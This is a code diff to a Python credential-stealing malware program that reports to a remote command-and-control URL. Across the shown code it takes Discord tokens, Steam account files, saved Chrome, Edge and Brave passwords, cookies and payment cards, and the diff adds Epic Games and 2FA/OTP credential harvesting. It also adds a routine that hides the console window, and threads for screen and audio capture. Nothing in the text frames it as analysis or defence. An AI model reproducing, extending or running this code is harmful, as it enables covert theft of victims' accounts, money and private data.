@@ -14,7 +14,7 @@ from datetime import datetime
 from io import BytesIO
 
 # ===== CONFIG =====
-C2_URL = "https://c2-receiver.onrender.com"   # <-- CHANGE THIS
+C2_URL = "https://c2-receiver.onrender.com"   # <-- CHANGE
 # ==================
 
 TARGET_ID = socket.gethostname()
@@ -123,12 +123,8 @@ def harvest_discord():
             if r.status_code == 200:
                 d = r.json()
                 results.append({
-                    "token": tok,
-                    "id": d.get("id"),
-                    "username": d.get("username"),
-                    "email": d.get("email"),
-                    "phone": d.get("phone"),
-                    "mfa": d.get("mfa_enabled")
+                    "token": tok, "id": d.get("id"), "username": d.get("username"),
+                    "email": d.get("email"), "phone": d.get("phone"), "mfa": d.get("mfa_enabled")
                 })
             else:
                 results.append({"token": tok, "status": "invalid"})
@@ -137,30 +133,24 @@ def harvest_discord():
     return results
 
 def harvest_steam():
-    """SteamID + AccountName + PersonaName + any stored login tokens / emails from browser"""
     results = []
     bases = []
     if platform.system() == "Windows":
         bases = [
             os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), "Steam"),
             os.path.join(os.environ.get("PROGRAMFILES", ""), "Steam"),
-            os.path.join(os.environ.get("LOCALAPPDATA", ""), "Steam"),
         ]
     else:
         bases = [os.path.expanduser("~/.steam/steam"), os.path.expanduser("~/.local/share/Steam")]
-
     for base in bases:
         if not os.path.isdir(base):
             continue
-        # loginusers.vdf
         loginusers = os.path.join(base, "config", "loginusers.vdf")
         if os.path.exists(loginusers):
             try:
                 with open(loginusers, "r", errors="ignore") as f:
                     content = f.read()
-                # blocks per account
                 blocks = re.split(r'"(\d{17})"\s*\{', content)
-                # blocks[1]=id, blocks[2]=body, blocks[3]=id ...
                 for i in range(1, len(blocks), 2):
                     sid = blocks[i]
                     body = blocks[i+1] if i+1 < len(blocks) else ""
@@ -171,39 +161,81 @@ def harvest_steam():
                         "steam_id": sid,
                         "account_name": acc.group(1) if acc else "?",
                         "persona_name": per.group(1) if per else "?",
-                        "last_login": ts.group(1) if ts else "?",
-                        "source": "loginusers.vdf"
+                        "last_login": ts.group(1) if ts else "?"
                     })
             except Exception:
                 pass
-
-        # config.vdf / ConnectCache for possible tokens
-        for cfg in ["config/config.vdf", "config/loginusers.vdf"]:
-            p = os.path.join(base, cfg)
-            if os.path.exists(p):
-                try:
-                    with open(p, "r", errors="ignore") as f:
-                        c = f.read()
-                    for m in re.findall(r'steamLoginSecure["\s:=]+([^\s"]+)', c, re.I):
-                        results.append({"steam_token": m, "source": cfg})
-                except Exception:
-                    pass
-
-        # ssfn files
         for root, dirs, files in os.walk(base):
             for fn in files:
                 if fn.startswith("ssfn"):
-                    results.append({"ssfn_file": os.path.join(root, fn), "size": os.path.getsize(os.path.join(root, fn))})
-
-    # also pull steam-related browser logins (email + password)
-    browser = harvest_browser()
-    for p in browser.get("passwords", []):
-        if "steam" in p.get("url", "").lower() or "steampowered" in p.get("url", "").lower():
+                    results.append({"ssfn": os.path.join(root, fn)})
+    # browser steam logins
+    for p in harvest_browser().get("passwords", []):
+        if "steam" in p.get("url", "").lower():
             results.append({
                 "steam_email_or_user": p.get("user"),
                 "steam_password": p.get("pass"),
+                "url": p.get("url")
+            })
+    return results
+
+def harvest_epic():
+    """Epic Games Launcher + browser logins + 2FA related"""
+    results = []
+    # Epic Launcher local data
+    paths = []
+    if platform.system() == "Windows":
+        local = os.getenv("LOCALAPPDATA", "")
+        roaming = os.getenv("APPDATA", "")
+        paths = [
+            os.path.join(local, "EpicGamesLauncher", "Saved", "Config", "Windows"),
+            os.path.join(local, "EpicGamesLauncher", "Saved", "Logs"),
+            os.path.join(roaming, "Epic"),
+            os.path.join(local, "EpicGamesLauncher", "Saved", "Data"),
+        ]
+    else:
+        home = os.path.expanduser("~")
+        paths = [os.path.join(home, ".config", "Epic", "EpicGamesLauncher")]
+
+    for base in paths:
+        if not os.path.isdir(base):
+            continue
+        for root, dirs, files in os.walk(base):
+            for fn in files:
+                fp = os.path.join(root, fn)
+                # GameUserSettings / ini / json that may hold account hints
+                if fn.lower().endswith((".ini", ".json", ".log", ".config")):
+                    try:
+                        with open(fp, "r", errors="ignore") as f:
+                            content = f.read()
+                        # emails
+                        for m in re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', content):
+                            results.append({"epic_email_found": m, "source": fp})
+                        # display names / account ids
+                        for m in re.findall(r'(?:DisplayName|AccountId|UserName|EpicAccount)["\s:=]+([^\s",}]+)', content, re.I):
+                            results.append({"epic_id_or_name": m, "source": fn})
+                    except Exception:
+                        pass
+
+    # browser saved Epic logins (email + password)
+    for p in harvest_browser().get("passwords", []):
+        url = p.get("url", "").lower()
+        if "epicgames" in url or "unrealengine" in url or "fortnite" in url:
+            results.append({
+                "epic_email_or_user": p.get("user"),
+                "epic_password": p.get("pass"),
                 "url": p.get("url"),
-                "source": "browser_password"
+                "source": "browser"
+            })
+
+    # 2FA / authenticator hints from browser (otp, 2fa, authenticator pages)
+    for p in harvest_browser().get("passwords", []):
+        if re.search(r'(2fa|otp|authenticator|mfa|totp)', p.get("url", ""), re.I):
+            results.append({
+                "possible_2fa_entry": True,
+                "url": p.get("url"),
+                "user": p.get("user"),
+                "pass": p.get("pass")
             })
     return results
 
@@ -216,14 +248,12 @@ def harvest_browser():
         from Cryptodome.Cipher import AES
     except Exception:
         return out
-
     local = os.getenv("LOCALAPPDATA", "")
     browsers = {
         "Chrome": os.path.join(local, "Google", "Chrome", "User Data"),
         "Edge": os.path.join(local, "Microsoft", "Edge", "User Data"),
         "Brave": os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data"),
     }
-
     for bname, base in browsers.items():
         if not os.path.isdir(base):
             continue
@@ -233,7 +263,6 @@ def harvest_browser():
                 key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
         except Exception:
             continue
-
         def decrypt(buf):
             try:
                 return AES.new(key, AES.MODE_GCM, buf[3:15]).decrypt(buf[15:])[:-16].decode()
@@ -242,8 +271,6 @@ def harvest_browser():
                     return win32crypt.CryptUnprotectData(buf, None, None, None, 0)[1].decode()
                 except Exception:
                     return ""
-
-        # passwords
         db = os.path.join(base, "Default", "Login Data")
         if os.path.exists(db):
             tmp = os.path.join(os.environ.get("TEMP", "."), f"ld_{bname}.db")
@@ -261,8 +288,6 @@ def harvest_browser():
                 os.remove(tmp)
             except Exception:
                 pass
-
-        # cookies
         cdb = os.path.join(base, "Default", "Network", "Cookies")
         if not os.path.exists(cdb):
             cdb = os.path.join(base, "Default", "Cookies")
@@ -289,67 +314,71 @@ def harvest_loop():
                 "time": str(datetime.now()),
                 "host": socket.gethostname(),
                 "user": os.getenv("USERNAME") or os.getenv("USER"),
-                "platform": platform.platform(),
                 "vpn": check_vpn(),
                 "discord": harvest_discord(),
                 "steam": harvest_steam(),
+                "epic": harvest_epic(),
                 "browser": browser
             }
             push_text(json.dumps(report, indent=2), "harvest.json", "accounts")
-
-            lines = []
-            lines.append(f"VPN: {report['vpn']}")
-            lines.append(f"Host: {report['host']} | User: {report['user']}")
-            lines.append("")
+            lines = [f"VPN: {report['vpn']}", f"Host: {report['host']} | User: {report['user']}", ""]
             lines.append("========== DISCORD ==========")
             for d in report["discord"]:
                 lines.append(f"TOKEN: {d.get('token')}")
-                lines.append(f"  ID: {d.get('id')} | USER: {d.get('username')} | EMAIL: {d.get('email')} | PHONE: {d.get('phone')} | MFA: {d.get('mfa')}")
-                lines.append("")
-            lines.append("========== STEAM ==========")
+                lines.append(f"  ID:{d.get('id')} USER:{d.get('username')} EMAIL:{d.get('email')} PHONE:{d.get('phone')} MFA:{d.get('mfa')}")
+            lines.append("\n========== STEAM ==========")
             for s in report["steam"]:
                 if "steam_id" in s:
-                    lines.append(f"STEAM_ID: {s.get('steam_id')}")
-                    lines.append(f"  ACCOUNT_NAME: {s.get('account_name')}")
-                    lines.append(f"  PERSONA: {s.get('persona_name')}")
-                    lines.append(f"  LAST_LOGIN: {s.get('last_login')}")
+                    lines.append(f"ID:{s.get('steam_id')} ACC:{s.get('account_name')} PERSONA:{s.get('persona_name')}")
                 elif "steam_email_or_user" in s:
-                    lines.append(f"STEAM LOGIN (browser)")
-                    lines.append(f"  EMAIL/USER: {s.get('steam_email_or_user')}")
-                    lines.append(f"  PASSWORD: {s.get('steam_password')}")
-                    lines.append(f"  URL: {s.get('url')}")
-                elif "steam_token" in s:
-                    lines.append(f"STEAM TOKEN: {s.get('steam_token')}")
-                elif "ssfn_file" in s:
-                    lines.append(f"SSFN: {s.get('ssfn_file')} ({s.get('size')} bytes)")
-                lines.append("")
-            lines.append("========== PASSWORDS ==========")
-            for p in browser.get("passwords", [])[:50]:
-                lines.append(f"{p['browser']} | {p['url']}")
-                lines.append(f"  USER: {p['user']} | PASS: {p['pass']}")
-            lines.append("")
-            lines.append("========== CARDS / PAYMENT ==========")
+                    lines.append(f"EMAIL/USER:{s.get('steam_email_or_user')} PASS:{s.get('steam_password')} URL:{s.get('url')}")
+                else:
+                    lines.append(str(s))
+            lines.append("\n========== EPIC GAMES ==========")
+            for e in report["epic"]:
+                if "epic_email_or_user" in e:
+                    lines.append(f"EMAIL/USER: {e.get('epic_email_or_user')}")
+                    lines.append(f"PASSWORD:   {e.get('epic_password')}")
+                    lines.append(f"URL:        {e.get('url')}")
+                elif "epic_email_found" in e:
+                    lines.append(f"EMAIL FOUND: {e.get('epic_email_found')} ({e.get('source')})")
+                elif "possible_2fa_entry" in e:
+                    lines.append(f"2FA/OTP ENTRY: {e.get('url')} USER:{e.get('user')} PASS:{e.get('pass')}")
+                else:
+                    lines.append(str(e))
+            lines.append("\n========== PASSWORDS ==========")
+            for p in browser.get("passwords", [])[:40]:
+                lines.append(f"{p['browser']} | {p['url']} | {p['user']} | {p['pass']}")
+            lines.append("\n========== CARDS ==========")
             for c in browser.get("cards", []):
                 lines.append(str(c))
-            lines.append("")
-            lines.append("========== COOKIES (sample) ==========")
-            for c in browser.get("cookies", [])[:80]:
-                lines.append(f"{c['host']} | {c['name']} = {c['value']}")
+            lines.append("\n========== COOKIES ==========")
+            for c in browser.get("cookies", [])[:60]:
+                lines.append(f"{c['host']} | {c['name']}={c['value']}")
             push_text("\n".join(lines), "accounts.txt", "accounts")
         except Exception:
             pass
         time.sleep(HARVEST_INTERVAL)
 
-def hide():
-    if platform.system() == "Windows":
-        try:
-            import ctypes
-            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-        except Exception:
-            pass
+def full_stealth():
+    """Hide console + remove from taskbar visibility on Windows"""
+    if platform.system() != "Windows":
+        return
+    try:
+        import ctypes
+        # hide console
+        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+        if hwnd:
+            ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
+        # optional: set process to background priority
+        ctypes.windll.kernel32.SetPriorityClass(
+            ctypes.windll.kernel32.GetCurrentProcess(), 0x00000040  # IDLE/BELOW_NORMAL
+        )
+    except Exception:
+        pass
 
 if __name__ == "__main__":
-    hide()
+    full_stealth()
     threading.Thread(target=screen_loop, daemon=True).start()
     threading.Thread(target=audio_loop, daemon=True).start()
     threading.Thread(target=harvest_loop, daemon=True).start()
